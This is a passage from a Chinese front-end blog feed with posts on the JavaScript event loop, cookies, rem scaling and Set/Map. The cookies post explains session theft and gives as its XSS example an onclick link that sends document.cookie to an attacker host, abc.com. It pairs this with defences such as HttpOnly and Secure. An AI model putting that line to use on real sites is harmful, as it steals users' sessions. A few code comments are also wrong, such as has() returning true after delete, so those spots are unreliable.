title="setInterval"></a>setInterval</h3><p>setInterval会每隔指定的时间就将回调函数放进事件队列，如果前面事件执行太久，同样需要等待。</p><p>对于setInterval(fn,ms)来说，我们知道每隔ms时间就会把fn放进事件队列，如果fn的执行时间超过了ms的话，刚执行完fn后，马上又在队列里找出下一个fn来执行，于是看不出时间间隔。还有当fn执行足够长时间时，事件队列又有一个fn在等待，此时又经过一个ms时间，发现事件队列里还有fn，这个时间段的fn就不会放进事件队列，造成了缺少或跳动显示的现象。</p><h3 id="Promise与process-nextTick-callback"><a href="#Promise与process-nextTick-callback" class="headerlink" title="Promise与process.nextTick(callback)"></a>Promise与process.nextTick(callback)</h3><p>process.nextTick(callback)类似node.js版的setTimeout，在事件循环的下次循环中调用callback回调函数</p><p>现在对异步任务分为</p><ol><li>宏任务：包括整体代码script，setTimeout， setInterval</li><li>微任务：Promise，process.nextTick</li></ol><p>不同类型的任务会进入对应的事件队列，比如两个定时器会进入宏任务事件队列</p><p>事件循环的顺序，决定js代码执行顺序。当JS引擎从任务队列取出一个宏任务来执行，如果执行过程遇到微任务，那么执行完该宏任务后就去执行宏任务里面所有微任务，然后更新UI。再从任务队列取出下一个宏任务，以此类推。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise'</span>);</span><br><span class="line">    resolve()</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'then'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'console'</span>);</span><br></pre></td></tr></table></figure><ol><li>这段代码作为宏任务，进入主线程</li><li>首先遇到setTimeout，将其回调函数注册后分发到宏任务事件队列</li><li>接下来遇到了Promise，new Promise立即执行,then函数分发到微任务事件队列</li><li>执行console.log(‘console’)</li><li>此时整体代码script作为第一个宏任务执行结束，我们发现then在微任务事件队列里面，执行</li><li>此时第一轮事件循环结束了，开始第二轮循环，继续从宏任务事件队列中寻找，找到了setTimeout对应的回调函数，立即执行</li><li>结束</li></ol><h3 id="事件循环，宏任务，微任务关系"><a href="#事件循环，宏任务，微任务关系" class="headerlink" title="事件循环，宏任务，微任务关系"></a>事件循环，宏任务，微任务关系</h3><p><img src="https://user-gold-cdn.xitu.io/2017/11/21/15fdcea13361a1ec?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p><h3 id="复杂例子"><a href="#复杂例子" class="headerlink" title="复杂例子"></a>复杂例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'1'</span>);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2'</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'3'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'4'</span>);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'5'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'6'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'7'</span>);</span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'8'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'9'</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'10'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'11'</span>);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'12'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol><li>整体代码script作为宏任务进入主线程，立即输出1</li><li>遇到setTimeout，其回调任务注册后马上放进宏任务事件队列，暂时记为setTimeout1</li><li>遇到process.nextTick()，将其回调函数放进微任务事件队列，记为process1</li><li>遇到promise，new Promise立即执行，输出了7，then函数放进微任务事件队列，记为then1</li><li>又遇到setTimeout，将回调函数任务注册后马上放进宏任务事件队列，记为setTimeout2</li><li>此时已经输出1和7</li><li>宏任务事件队列有setTimeout1，setTimeout2。微任务事件队列有process1，then1</li><li>执行微任务事件队列的process1，输出6，执行then1，输出8</li><li>开始第二轮事件循环，在宏任务事件队列找出setTimeout1，立即输出2</li><li>遇到process.nextTick，将回调函数放进微任务事件队列，记为process2</li><li>遇到new Promise，立即执行输出4，then函数放进微任务事件队列，记为then2</li><li>此时已经输出2,4</li><li>宏任务事件队列有setTimeout2。微任务事件队列有process2，then2</li><li>执行微任务事件队列的process2，输出3。then2执行后输出5</li><li>第二轮事件循环结束，开始第三轮，此时宏任务事件队列还有setTimeout2,</li><li>立即输出9</li><li>遇到process.nextTick，将其回调函数放进微任务事件队列，记为process3</li><li>遇到new Promise，立即执行输出11，将then函数放进微任务事件队列，记为then3</li><li>此时微任务事件队列里有process3和then3，执行process3输出10，执行then3输出12</li><li>整段代码，共进行了三次事件循环，完整的输出为1，7，6，8，2，4，3，5，9，11，10，12。</li><li>在node.js环境下事件监听顺序略有不同，定时器的微任务会在整个代码块中最后输出，process.nextTick会优先于promise，结果为1，7，6，8，2，4，9，11，3,10,5，12。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;JS执行机制&quot;&gt;&lt;a href=&quot;#JS执行机制&quot; class=&quot;headerlink&quot; title=&quot;JS执行机制&quot;&gt;&lt;/a&gt;JS执行机制&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Javascript是一门单线程的语言，多线程都是用单线程模拟出来的。而Event Loop是javascript的执行机制，是js实现异步的一种方法。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="javascript" scheme="https://gzzzzh.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>cookies详解</title>
    <link href="https://gzzzzh.github.io/2019/05/29/cookies%E8%AF%A6%E8%A7%A3/"/>
    <id>https://gzzzzh.github.io/2019/05/29/cookies详解/</id>
    <published>2019-05-29T06:46:32.000Z</published>
    <updated>2019-05-29T08:28:44.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>“Cookie”是小量信息，由网络服务器发送出来以存储在网络浏览器上，从而下次这位独一无二的访客又回到该网络服务器时，可从该浏览器读回此信息。这是很有用的，让浏览器记住这位访客的特定信息，如上次访问的位置、花费的时间或用户首选项（如样式表）。Cookie 是个存储在浏览器目录的文本文件，当浏览器运行时，存储在 RAM 中。一旦你从该网站或网络服务器退出，Cookie 也可存储在计算机的硬驱上。当访客结束其浏览器对话时，即终止的所有 Cookie。<br><a id="more"></a></p><h3 id="1-大小受限"><a href="#1-大小受限" class="headerlink" title="1.大小受限"></a>1.大小受限</h3><p>各个浏览器下的cookie大小每个域控制在4kb以内，数量谷歌和safari没有限制，火狐50个，opera30个，ie7之后50个，ie620个</p><h3 id="2-两种类型"><a href="#2-两种类型" class="headerlink" title="2.两种类型"></a>2.两种类型</h3><p>会话cookie是一种临时cookie，用户退出浏览器，会话Cookie就会被删除了，持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性访问服务器的配置文件或者登录信息。</p><p>持久cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）</p><p><strong>Expires</strong>是cookie的最长有效时间，如果没有设置这个属性，那么表示这是一个会话期 cookie 。一个会话结束于客户端被关闭时，这意味着会话期 cookie 在彼时会被移除。</p><p><strong>Max-Age</strong>是cookie失效之前需要经过的秒数，优先级比Expires要高。ie8和以下不支持</p><h3 id="3-域"><a href="#3-域" class="headerlink" title="3.域"></a>3.域</h3><p>指定 cookie 可以送达的主机名。假如没有指定，那么默认值为当前文档访问地址中的主机部分（但是不包含子域名），域名之前的点号会被忽略。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=&quot;wang&quot;; domain=&quot;huangchao.cn&quot;</span><br></pre></td></tr></table></figure></p><p>经过测试在<a href="http://www.huangchao.cn无法获取这个cookie并且发出去" target="_blank" rel="noopener">www.huangchao.cn无法获取这个cookie并且发出去</a></p><h3 id="4-path"><a href="#4-path" class="headerlink" title="4.path"></a>4.path</h3><p>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送 Cookie 首部。一般设置为/，就可以在请求中方便的带上cookie发送。</p><h3 id="5-操作cookies"><a href="#5-操作cookies" class="headerlink" title="5.操作cookies"></a>5.操作cookies</h3><p>通过docuemnt.cookie可以设置和获取Cookie的值</p><p>但我经常会使用jscookie这个插件来进行操作，基本用法是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookies.get(name)</span><br><span class="line"></span><br><span class="line">Cookies.set(name,val,&#123;<span class="attr">expires</span>:<span class="number">7</span>,<span class="attr">path</span>:<span class="string">'/'</span>&#125;)</span><br><span class="line"></span><br><span class="line">Cookies.remove(name)</span><br></pre></td></tr></table></figure></p><p>一般来说，禁止js操作cookies，为了避免跨域脚本攻击xss，cookies属性中有HttpOnly时无法操作这个cookies</p><h2 id="Cookies的安全"><a href="#Cookies的安全" class="headerlink" title="Cookies的安全"></a>Cookies的安全</h2><p>多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。</p><h3 id="网络窃听"><a href="#网络窃听" class="headerlink" title="网络窃听"></a>网络窃听</h3><p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。</p><p><strong>解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。</strong></p><h3 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h3><p>使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=`<span class="attr">window.location</span>=<span class="string">http://abc.com?cookie</span>=<span class="string">$&#123;docuemnt.cookie&#125;</span>`&gt;</span>领取红包<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。</p><p><strong>解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。</strong></p><h3 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h3><p>CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p><p>anShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素。如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p><p><strong>解决办法：增加其他信息的校验（验证码，手机令牌等），尽量用post请求，常用token</strong></p><p>关于csrf和xss会另外详细研究说明</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;“Cookie”是小量信息，由网络服务器发送出来以存储在网络浏览器上，从而下次这位独一无二的访客又回到该网络服务器时，可从该浏览器读回此信息。这是很有用的，让浏览器记住这位访客的特定信息，如上次访问的位置、花费的时间或用户首选项（如样式表）。Cookie 是个存储在浏览器目录的文本文件，当浏览器运行时，存储在 RAM 中。一旦你从该网站或网络服务器退出，Cookie 也可存储在计算机的硬驱上。当访客结束其浏览器对话时，即终止的所有 Cookie。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="cookies" scheme="https://gzzzzh.github.io/tags/cookies/"/>
    
  </entry>
  
  <entry>
    <title>封装rem</title>
    <link href="https://gzzzzh.github.io/2019/05/22/%E5%B0%81%E8%A3%85rem/"/>
    <id>https://gzzzzh.github.io/2019/05/22/封装rem/</id>
    <published>2019-05-22T11:45:54.000Z</published>
    <updated>2019-05-22T11:48:34.530Z</updated>
    
    <content type="html"><![CDATA[<p>designWidth是我们设计稿的总宽度，fontSize是html根元素的字体大小，一般设置为100方便计算。<br><a id="more"></a><br>函数需要传入设计稿的宽度和根元素字体大小，然后会根据不同屏幕宽度自动算出当前宽度下的根元素大小，也就是说，我们只需要在设计稿算出px是多少rem，就能应用在我们不同的屏幕下了</p><p>如果用vscode的px转rem插件，需要在插件设置设计稿下根元素的大小。例如根元素是100px，在设计稿上有个元素宽度是100px，那么就是1rem，通过插件，我们不同屏幕下写代码，也只是需要写100px，自动转换成1rem，在页面展示的时候这1rem就根据你当前的根元素进行计算实际宽度了，十分方便，减少计算<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rem = <span class="function">(<span class="params">designWidth,fontSize</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> clientWidth = <span class="built_in">document</span>.body.clientWidth || <span class="built_in">document</span>.documentElement.clientWidth</span><br><span class="line">  <span class="keyword">if</span>(!clientWidth) &#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(clientWidth == designWidth) &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'html'</span>)[<span class="number">0</span>].style.fontSize = fontSize + <span class="string">'px'</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'html'</span>)[<span class="number">0</span>].style.fontSize = fontSize*(clientWidth/designWidth) + <span class="string">'px'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rem(<span class="number">1581</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>,()=&gt;&#123;</span><br><span class="line">  rem(<span class="number">1581</span>,<span class="number">100</span>)</span><br><span class="line">&#125;,<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;designWidth是我们设计稿的总宽度，fontSize是html根元素的字体大小，一般设置为100方便计算。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="rem" scheme="https://gzzzzh.github.io/tags/rem/"/>
    
      <category term="css" scheme="https://gzzzzh.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>Set和Map数据结构</title>
    <link href="https://gzzzzh.github.io/2019/05/07/Set%E5%92%8CMap%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>https://gzzzzh.github.io/2019/05/07/Set和Map数据结构/</id>
    <published>2019-05-07T10:41:39.000Z</published>
    <updated>2019-05-07T10:43:32.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><h2 id="含义和基本用法"><a href="#含义和基本用法" class="headerlink" title="含义和基本用法"></a>含义和基本用法</h2><p>它类似于对象，也是键值对的集合。但是键的范围不限于字符串，各种类型的值都可以当做键，提供了”值-值”的对应，如果需要键值对的数据结构Map比Object更合适<br><a id="more"></a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">p</span>:<span class="string">'hello world'</span>&#125;</span><br><span class="line"></span><br><span class="line">m.set(o,<span class="string">'content'</span>)</span><br><span class="line">m.get(o) <span class="comment">//'content'</span></span><br><span class="line"></span><br><span class="line">m.has(o) <span class="comment">//true</span></span><br><span class="line">m.delete(o) <span class="comment">//true</span></span><br><span class="line">m.has(o) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//还可以传入一个数组作为参数，这个数组成员是一个个表示键值对的数组</span></span><br><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  [<span class="string">'name'</span>,<span class="string">'Tom'</span>],</span><br><span class="line">  [<span class="string">'age'</span>,<span class="number">10</span>]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(arr)</span><br></pre></td></tr></table></figure></p><p>事实上，不仅仅是数组，任何具有Iterator接口，且每个成员都是一个双元素的数组，都可以当做map构造函数的参数，例如可以用Set和Map生成新的Map<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">set</span> = new Set([</span><br><span class="line">  ['name','Tom'],</span><br><span class="line">  ['age',10]</span><br><span class="line">])</span><br><span class="line">const map = new Map(<span class="keyword">set</span>)</span><br></pre></td></tr></table></figure></p><p>值得注意，如果对同一个键多次赋值，后面的会覆盖前面，读取一个未知的键会返回undefined</p><p><hr><br>下面的set，get方法，表面针对同一个键，但因为内存地址不一样，实际上是两个值。在使用对象或者数组作为键时应注意这点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">map.set([<span class="string">'a'</span>],<span class="number">1</span>)</span><br><span class="line">map.get([<span class="string">'a'</span>]) <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></p><p>由上我们可得知如果键是简单类型的值，只要严格相等，Map就会视为一个键。<strong>-0</strong>和<strong>0</strong>是同一个，<strong>undefined</strong>和<strong>null</strong>是两个不同的键，<strong>NaN</strong>被视为同一个键</p><hr><p>##　实例属性和操作方法</p><h4 id="1-size属性"><a href="#1-size属性" class="headerlink" title="1.size属性"></a>1.size属性</h4><p>size返回Map结构成员的总数</p><h4 id="2-set"><a href="#2-set" class="headerlink" title="2.set"></a>2.set</h4><p>set方法设置键名key对应的键值为value。然后返回整个Map结构，因此可以采用链式写法。key如果已经有值，会进行更新覆盖。</p><h4 id="3-get"><a href="#3-get" class="headerlink" title="3. get"></a>3. get</h4><p>get方法读取key对应的键值，如果找不到key，会返回undefined</p><h4 id="4-has"><a href="#4-has" class="headerlink" title="4.has"></a>4.has</h4><p>返回一个布尔值，表示某个键是否在Map对象之中</p><h4 id="5-delete"><a href="#5-delete" class="headerlink" title="5.delete"></a>5.delete</h4><p>删除某个键，返回true，删除失败返回false</p><h4 id="6-clear"><a href="#6-clear" class="headerlink" title="6.clear"></a>6.clear</h4><p>清除所有成员，没有返回值</p><hr><h2 id="遍历方法"><a href="#遍历方法" class="headerlink" title="遍历方法"></a>遍历方法</h2><ul><li>keys()：返回键名的遍历器</li><li>values():返回键值的遍历器</li><li>entries():返回所有成员的遍历器，是默认遍历器，意味着可以省略这个方法，直接用map代替</li><li>forEach():遍历Map的所有成员，和数组的的forEach类似</li></ul><hr><h2 id="与其他数据结构格式的转换"><a href="#与其他数据结构格式的转换" class="headerlink" title="与其他数据结构格式的转换"></a>与其他数据结构格式的转换</h2><h4 id="1-Map转为数组"><a href="#1-Map转为数组" class="headerlink" title="1.Map转为数组"></a>1.Map转为数组</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  .set(<span class="number">1</span>,<span class="literal">true</span>)</span><br><span class="line">  .set(<span class="number">2</span>,<span class="literal">false</span>)</span><br><span class="line">[...map] <span class="comment">// [[1,true],[2,false]]</span></span><br></pre></td></tr></table></figure><h4 id="2-Map转为对象"><a href="#2-Map转为对象" class="headerlink" title="2.Map转为对象"></a>2.Map转为对象</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapToObj</span>(<span class="params">map</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> [key,value] <span class="keyword">of</span> map )&#123;</span><br><span class="line">    obj[key] = value</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有非字符串的键名，那么这个键名会被转换成字符串再做对象的键名</p><h4 id="3-对象转成Map"><a href="#3-对象转成Map" class="headerlink" title="3.对象转成Map"></a>3.对象转成Map</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objToMap</span> (<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj))&#123;</span><br><span class="line">    map.set(key,obj[key])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h1><h2 id="含义和基本用法-1"><a href="#含义和基本用法-1" class="headerlink" title="含义和基本用法"></a>含义和基本用法</h2><p>它类似于数组，但是成员的值都是唯一的，没有重复的值。他不会添加重复值，可以接受一个数组(或者其他具有iterator 接口的其他数据结构)作为参数，加入值的时候<strong>NaN</strong>会在内部当成相同的值，两个对象总是不相等，因此被视为两个值</p><hr><h2 id="属性和方法"><a href="#属性和方法" class="headerlink" title="属性和方法"></a>属性和方法</h2><h4 id="1-size"><a href="#1-size" class="headerlink" title="1.size"></a>1.size</h4><p>返回Set实例成员的个数</p><h4 id="2-add"><a href="#2-add" class="headerlink" title="2.add"></a>2.add</h4><p>添加某个值，返回Set结构本身，可以链式写法</p><h4 id="3-delete"><a href="#3-delete" class="headerlink" title="3.delete"></a>3.delete</h4><p>删除某个值，返回一个布尔值表示删除是否成功</p><h4 id="4-has-1"><a href="#4-has-1" class="headerlink" title="4.has"></a>4.has</h4><p>返回一个布尔值，表示该值是否为Set的成员</p><h4 id="5-clear"><a href="#5-clear" class="headerlink" title="5.clear"></a>5.clear</h4><p>清楚所有成员，没有返回值</p><p>Array.form可以将Set结构转换为数组</p><hr><h2 id="遍历方法-1"><a href="#遍历方法-1" class="headerlink" title="遍历方法"></a>遍历方法</h2><ul><li>keys()：返回键名的遍历器</li><li>values():返回键值的遍历器,是默认的遍历器，意味着可以省略这个方法用set代替</li><li>entries():返回所有成员的遍历器</li><li>forEach():遍历Set的所有成员</li></ul><p>由于Set结构没有键名，只有键值，也可以说键名和键值是同一个值，因此keys和values返回的是同一个结果</p><hr><h2 id="遍历应用"><a href="#遍历应用" class="headerlink" title="遍历应用"></a>遍历应用</h2><h4 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> unique = [...new <span class="built_in">Set</span>(arr)] <span class="comment">//[1,2,3,4]</span></span><br></pre></td></tr></table></figure><h4 id="字符串去重"><a href="#字符串去重" class="headerlink" title="字符串去重"></a>字符串去重</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">'aaaabbbbccc'</span></span><br><span class="line"><span class="keyword">let</span> unique = [...new <span class="built_in">Set</span>(str)].join(<span class="string">''</span>) <span class="comment">//abc</span></span><br></pre></td></tr></table></figure><h4 id="并集交集差集"><a href="#并集交集差集" class="headerlink" 